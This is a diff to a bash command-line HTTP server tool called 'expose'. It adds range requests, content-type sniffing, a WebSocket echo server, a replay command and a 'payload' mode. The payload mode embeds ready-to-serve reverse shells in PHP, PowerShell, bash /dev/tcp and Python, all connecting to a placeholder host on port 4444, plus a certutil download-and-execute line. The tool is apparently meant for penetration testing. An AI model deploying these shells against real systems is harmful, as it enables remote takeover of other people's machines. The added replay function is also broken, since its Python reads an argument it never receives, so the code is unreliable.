-elif [ "$PTH" = "/content" ] && [ "$MTH" = "GET" ]; then
+elif [ "$PTH" = "/content" ] && [ "$MTH" = "GET" -o "$MTH" = "HEAD" ]; then
   _DISP=""
   [ -n "${EXPOSE_FILENAME:-}" ] && _DISP="Content-Disposition: inline; filename=\"${EXPOSE_FILENAME}\"\r\n"
-  printf 'HTTP/1.1 %s %s\r\nContent-Type: %s\r\nContent-Length: %s\r\n%bConnection: close\r\nServer: expose\r\n%b\r\n' \
-    "$_RCODE" "$_RREASON" "$EXPOSE_MIME" "$EXPOSE_LEN" "$_DISP" "${EXPOSE_RESP_HEADERS:-}"
-  cat "$EXPOSE_CONTENT"
+
+  # ── Auto content-type detection for text mode ──
+  _CT="$EXPOSE_MIME"
+  if [ "$_CT" = "text/plain; charset=utf-8" ] && [ "${EXPOSE_LEN:-0}" -gt 0 ] 2>/dev/null; then
+    _FIRST=$(head -c 1 "$EXPOSE_CONTENT" 2>/dev/null || true)
+    case "$_FIRST" in
+      '{') _CT="application/json; charset=utf-8" ;;
+      '<') _CT="text/html; charset=utf-8" ;;
+      '[') _CT="application/json; charset=utf-8" ;;
+    esac
+    # Check for XML declaration
+    if [ "$_CT" = "text/plain; charset=utf-8" ]; then
+      _PEEK=$(head -c 5 "$EXPOSE_CONTENT" 2>/dev/null || true)
+      case "$_PEEK" in
+        '<?xml') _CT="application/xml; charset=utf-8" ;;
+        '---'|'---\n') _CT="text/yaml; charset=utf-8" ;;
+      esac
+    fi
+  fi
+
+  # ── Range request support ──
+  # range header captured during parsing
+  if [ -n "$RANGE_HDR" ] && [ "${EXPOSE_LEN:-0}" -gt 0 ] 2>/dev/null; then
+    _RANGE_START=$(printf '%s' "$RANGE_HDR" | sed -n 's/bytes=\([0-9]*\)-.*/\1/p')
+    _RANGE_END=$(printf '%s' "$RANGE_HDR" | sed -n 's/bytes=[0-9]*-\([0-9]*\)/\1/p')
+    [ -z "$_RANGE_START" ] && _RANGE_START=0
+    if [ -z "$_RANGE_END" ]; then
+      _RANGE_END=$(( EXPOSE_LEN - 1 ))
+    fi
+    _RANGE_LEN=$(( _RANGE_END - _RANGE_START + 1 ))
+    if [ "$_RANGE_START" -lt "$EXPOSE_LEN" ] 2>/dev/null; then
+      printf 'HTTP/1.1 206 Partial Content\r\nContent-Type: %s\r\nContent-Range: bytes %s-%s/%s\r\nContent-Length: %s\r\nAccept-Ranges: bytes\r\n%bConnection: close\r\nServer: expose\r\n%b\r\n' \
+        "$_CT" "$_RANGE_START" "$_RANGE_END" "$EXPOSE_LEN" "$_RANGE_LEN" "$_DISP" "${EXPOSE_RESP_HEADERS:-}"
+      tail -c "+$((_RANGE_START + 1))" "$EXPOSE_CONTENT" 2>/dev/null | head -c "$_RANGE_LEN"
+    else
+      printf 'HTTP/1.1 416 Range Not Satisfiable\r\nContent-Range: bytes */%s\r\nContent-Length: 0\r\nConnection: close\r\nServer: expose\r\n\r\n' "$EXPOSE_LEN"
+    fi
+  else
+    printf 'HTTP/1.1 %s %s\r\nContent-Type: %s\r\nContent-Length: %s\r\nAccept-Ranges: bytes\r\n%bConnection: close\r\nServer: expose\r\n%b\r\n' \
+      "$_RCODE" "$_RREASON" "$_CT" "$EXPOSE_LEN" "$_DISP" "${EXPOSE_RESP_HEADERS:-}"
+    cat "$EXPOSE_CONTENT"
+  fi
 elif [ "$PTH" = "/upload" ] && [ "$MTH" = "POST" ]; then
   export UPLOAD_CT="$CONTENT_TYPE" UPLOAD_CL="$CONTENT_LEN"
   python3 "$EXPOSE_UPLOAD_PY"
@@ -1520,6 +1494,13 @@ elif printf '%s' "$PTH" | grep -q '^/upload/files/' && [ "$MTH" = "DELETE" ]; th
     BODY='{"error":"not found"}'
     printf 'HTTP/1.1 404 Not Found\r\nContent-Type: application/json\r\nContent-Length: %s\r\nConnection: close\r\n\r\n%s' "${#BODY}" "$BODY"
   fi
+elif [ "$PTH" = "/chat" ] && [ "$MTH" = "GET" ]; then
+  if [ -f "${EXPOSE_CHAT_FILE:-}" ]; then
+    BODY=$(cat "$EXPOSE_CHAT_FILE" 2>/dev/null || echo '[]')
+  else
+    BODY='[]'
+  fi
+  printf 'HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %s\r\nConnection: close\r\nServer: expose\r\n\r\n%s' "${#BODY}" "$BODY"
 else
   BODY='Not Found'
   printf 'HTTP/1.1 404 Not Found\r\nContent-Type: text/plain\r\nContent-Length: %s\r\nConnection: close\r\nServer: expose\r\n\r\n%s' "${#BODY}" "$BODY"
@@ -1538,6 +1519,79 @@ HANDLER
   echo "$h"
 }
 
+# ── Payload resolver ──────────────────────────────────────────────────────────
+resolve_payload() {
+  local name="$1"
+  bash -c "$(cat <<'PAYLOAD_SRC'
+# ── Payload templates ───────────────────────────────────────────────────────
+# Usage: called from serve.sh resolve_payload()
+# Prints payload content to stdout or returns empty string if unknown
+
+name="${1:-}"
+
+case "$name" in
+  php-reverse-shell)
+    cat <<'EOF'
+<?php
+set_time_limit(0);
+$ip = 'CHANGE_ME';
+$port = 4444;
+$sock = fsockopen($ip, $port);
+$proc = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
+?>
+EOF
+    ;;
+
+  powershell-reverse)
+    echo '$client = New-Object System.Net.Sockets.TCPClient("CHANGE_ME",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+    ;;
+
+  certutil-download)
+    cat <<'EOF'
+certutil -urlcache -split -f http://CHANGE_ME:9090/payload.exe C:\Windows\Temp\payload.exe && C:\Windows\Temp\payload.exe
+EOF
+    ;;
+
+  linux-reverse)
+    echo 'bash -i >& /dev/tcp/CHANGE_ME/4444 0>&1'
+    ;;
+
+  python-reverse)
+    cat <<'EOF'
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("CHANGE_ME",4444))
+os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
+import pty; pty.spawn("bash")
+EOF
+    ;;
+
+  *)
+    exit 1
+    ;;
+esac
+exit 0
+PAYLOAD_SRC
+)" -- "$name"
+}
+
+# ── Common exports ────────────────────────────────────────────────────────────
+_export_common() {
+  export EXPOSE_VERBOSE="$VERBOSE" EXPOSE_COUNTER="$_COUNTERFILE"
+  export EXPOSE_UPLOAD_HTML="$_UPLOAD_HTML" EXPOSE_UPLOAD_PY="$_UPLOAD_PY" EXPOSE_UPLOAD_DIR="$UPLOAD_DIR"
+  export EXPOSE_AUTH="$AUTH" EXPOSE_CATCH="$CATCH" EXPOSE_RESP_CODE="${RESP_CODE:-200}"
+  export EXPOSE_RESP_HEADERS="$_RESP_HDRS"
+  export EXPOSE_LOGFILE="$_LOGFILE"
+  export EXPOSE_ONCE="$ONCE" EXPOSE_SOCAT_PIDFILE="$_socatpf"
+  export EXPOSE_ALLOW="$_EXPOSE_ALLOW"
+  export EXPOSE_BODY_LIMIT="$BODY_LIMIT"
+  export EXPOSE_REDIRECT="$REDIRECT"
+  export EXPOSE_DELAY_MS="$DELAY_MS"
+  export EXPOSE_PAYLOAD="$PAYLOAD"
+  export EXPOSE_COLLECT="$COLLECT"
+  export EXPOSE_COLLECT_FILE="$_COLLECT_FILE"
+}
+
 # ── Serve: text ───────────────────────────────────────────────────────────────
 serve_text() {
   local cf
@@ -1548,14 +1602,7 @@ serve_text() {
   _socatpf=$(_mktmp /tmp/expose-socatpid.XXXXXX)
 
   export EXPOSE_CONTENT="$cf" EXPOSE_LEN="${#1}" EXPOSE_MIME="text/plain; charset=utf-8"
-  export EXPOSE_VERBOSE="$VERBOSE" EXPOSE_COUNTER="$_COUNTERFILE"
-  export EXPOSE_UPLOAD_HTML="$_UPLOAD_HTML" EXPOSE_UPLOAD_PY="$_UPLOAD_PY" EXPOSE_UPLOAD_DIR="$UPLOAD_DIR"
-  export EXPOSE_AUTH="$AUTH" EXPOSE_CATCH="$CATCH" EXPOSE_RESP_CODE="${RESP_CODE:-200}"
-  export EXPOSE_RESP_HEADERS="$_RESP_HDRS"
-  export EXPOSE_LOGFILE="$_LOGFILE"
-  export EXPOSE_ONCE="$ONCE" EXPOSE_SOCAT_PIDFILE="$_socatpf"
-  export EXPOSE_ALLOW="$_EXPOSE_ALLOW"
-  export EXPOSE_BODY_LIMIT="$BODY_LIMIT"
+  _export_common
 
   local _listen
   if [[ $TLS -eq 1 ]]; then
@@ -1582,14 +1629,7 @@ serve_file() {
 
   export EXPOSE_CONTENT="$fp" EXPOSE_LEN="$sz" EXPOSE_MIME="$mime"
   export EXPOSE_FILENAME="$(basename "$fp")"
-  export EXPOSE_VERBOSE="$VERBOSE" EXPOSE_COUNTER="$_COUNTERFILE"
-  export EXPOSE_UPLOAD_HTML="$_UPLOAD_HTML" EXPOSE_UPLOAD_PY="$_UPLOAD_PY" EXPOSE_UPLOAD_DIR="$UPLOAD_DIR"
-  export EXPOSE_AUTH="$AUTH" EXPOSE_CATCH="$CATCH" EXPOSE_RESP_CODE="${RESP_CODE:-200}"
-  export EXPOSE_RESP_HEADERS="$_RESP_HDRS"
-  export EXPOSE_LOGFILE="$_LOGFILE"
-  export EXPOSE_ONCE="$ONCE" EXPOSE_SOCAT_PIDFILE="$_socatpf"
-  export EXPOSE_ALLOW="$_EXPOSE_ALLOW"
-  export EXPOSE_BODY_LIMIT="$BODY_LIMIT"
+  _export_common
 
   local _listen
   if [[ $TLS -eq 1 ]]; then
@@ -2033,11 +2073,211 @@ with Server((bind_addr, port), Handler) as httpd:
 PYEOF
 }
 
+# ── Serve: redirect ───────────────────────────────────────────────────────────
+serve_redirect() {
+  serve_text ""
+}
+
+# ── Serve: payload ────────────────────────────────────────────────────────────
+serve_payload() {
+  local content
+  content=$(resolve_payload "$PAYLOAD")
+  [[ -z "$content" ]] && die "Unknown payload: $PAYLOAD. Run expose --help for list."
+  serve_text "$content"
+}
+
+# ── Serve: websocket ──────────────────────────────────────────────────────────
+serve_websocket() {
+  export EXPOSE_PORT="$PORT" EXPOSE_BIND="$BIND"
+  info "WebSocket echo server on ws://${BIND}:${PORT}"
+  python3 <<'PYEOF'
+#!/usr/bin/env python3
+"""WebSocket echo server for expose --websocket"""
+import struct, hashlib, base64, sys, os, socket
+
+PORT = int(os.environ.get('EXPOSE_PORT', 9090))
+BIND = os.environ.get('EXPOSE_BIND', '0.0.0.0')
+
+GUID = b"258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
+
+def accept_key(key):
+    sha1 = hashlib.sha1(key.encode() + GUID).digest()
+    return base64.b64encode(sha1).decode()
+
+def read_frame(sock):
+    data = sock.recv(2)
+    if len(data) < 2:
+        return None, b''
+    opcode = data[0] & 0x0F
+    masked = (data[1] & 0x80) != 0
+    length = data[1] & 0x7F
+    if length == 126:
+        data = sock.recv(2)
+        length = struct.unpack('>H', data)[0]
+    elif length == 127:
+        data = sock.recv(8)
+        length = struct.unpack('>Q', data)[0]
+    mask_key = sock.recv(4) if masked else b''
+    payload = bytearray()
+    while len(payload) < length:
+        chunk = sock.recv(min(length - len(payload), 4096))
+        if not chunk:
+            break
+        payload.extend(chunk)
+    if masked:
+        payload = bytearray(b ^ mask_key[i % 4] for i, b in enumerate(payload))
+    return opcode, bytes(payload)
+
+def send_frame(sock, opcode, payload):
+    frame = bytearray([0x80 | opcode])
+    length = len(payload)
+    if length < 126:
+        frame.append(length)
+    elif length < 65536:
+        frame.append(126)
+        frame.extend(struct.pack('>H', length))
+    else:
+        frame.append(127)
+        frame.extend(struct.pack('>Q', length))
+    frame.extend(payload)
+    sock.sendall(bytes(frame))
+
+def handle_client(conn):
+    try:
+        data = b''
+        while b'\r\n\r\n' not in data:
+            chunk = conn.recv(4096)
+            if not chunk:
+                return
+            data += chunk
+
+        headers = {}
+        for line in data.decode('utf-8', 'replace').split('\r\n')[1:]:
+            if ':' in line:
+                k, v = line.split(':', 1)
+                headers[k.strip().lower()] = v.strip()
+
+        key = headers.get('sec-websocket-key', '')
+        if not key:
+            conn.sendall(b'HTTP/1.1 400 Bad Request\r\n\r\n')
+            return
+
+        accept = accept_key(key)
+        resp = (
+            'HTTP/1.1 101 Switching Protocols\r\n'
+            'Upgrade: websocket\r\n'
+            'Connection: Upgrade\r\n'
+            f'Sec-WebSocket-Accept: {accept}\r\n'
+            '\r\n'
+        )
+        conn.sendall(resp.encode())
+
+        while True:
+            opcode, payload = read_frame(conn)
+            if opcode is None:
+                break
+            if opcode == 0x8:  # Close
+                send_frame(conn, 0x8, b'')
+                break
+            elif opcode == 0x9:  # Ping
+                send_frame(conn, 0xA, payload)  # Pong
+            elif opcode == 0x1:  # Text
+                send_frame(conn, 0x1, b'Echo: ' + payload)
+            elif opcode == 0x2:  # Binary
+                send_frame(conn, 0x2, payload)
+    except Exception:
+        pass
+    finally:
+        try:
+            conn.close()
+        except Exception:
+            pass
+
+def main():
+    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    srv.bind((BIND, PORT))
+    srv.listen(5)
+    print(f'WebSocket echo server: ws://{BIND}:{PORT}', file=sys.stderr)
+    try:
+        while True:
+            conn, addr = srv.accept()
+            print(f'  {addr[0]}:{addr[1]} connected', file=sys.stderr)
+            handle_client(conn)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        srv.close()
+
+if __name__ == '__main__':
+    main()
+PYEOF
+}
+
+# ── Replay ────────────────────────────────────────────────────────────────────
+do_replay() {
+  local logfile="$1"
+  [[ -f "$logfile" ]] || die "Log file not found: $logfile"
+  python3 <<'PYEOF'
+import sys, json, http.client, urllib.parse
+
+logfile = sys.argv[1]
+
+with open(logfile) as f:
+    log = json.load(f)
+
+if not log:
+    print("No requests in log")
+    sys.exit(1)
+
+# Replay the last request
+entry = log[-1]
+method = entry.get('method', 'GET')
+path = entry.get('path', '/')
+host = entry.get('host', 'localhost')
+
+# Parse host:port from host header
+if ':' in host:
+    hostname, port = host.split(':', 1)
+    port = int(port)
+else:
+    hostname = host
+    port = 80
+
+print(f"Replaying {method} {path} -> {hostname}:{port}")
+
+conn = http.client.HTTPConnection(hostname, port, timeout=10)
+headers = {}
+if entry.get('ua'):
+    headers['User-Agent'] = entry['ua']
+if entry.get('accept'):
+    headers['Accept'] = entry['accept']
+if entry.get('content_type'):
+    headers['Content-Type'] = entry['content_type']
+
+body = entry.get('body', '') if entry.get('body') else None
+try:
+    conn.request(method, path, body=body, headers=headers)
+    resp = conn.getresponse()
+    print(f"Response: {resp.status} {resp.reason}")
+    print(resp.read().decode('utf-8', 'replace')[:2000])
+except Exception as e:
+    print(f"Error: {e}")
+finally:
+    conn.close()
+PYEOF
+  python3 - "$TARGET"
+}
+
 # ── Run ───────────────────────────────────────────────────────────────────────
 export EXPOSE_MODE="$MODE"
 case "$MODE" in
-  text)  serve_text "$TARGET" ;;
-  catch) serve_text "" ;;
-  file)  serve_file "$TARGET" ;;
-  dir)   serve_dir ;;
+  text)     serve_text "$TARGET" ;;
+  catch)    serve_text "" ;;
+  file)     serve_file "$TARGET" ;;
+  dir)      serve_dir ;;
+  redirect) serve_redirect ;;
+  payload)  serve_payload ;;
+  websocket) serve_websocket ;;
+  replay)   do_replay "$TARGET" ;;
 esac
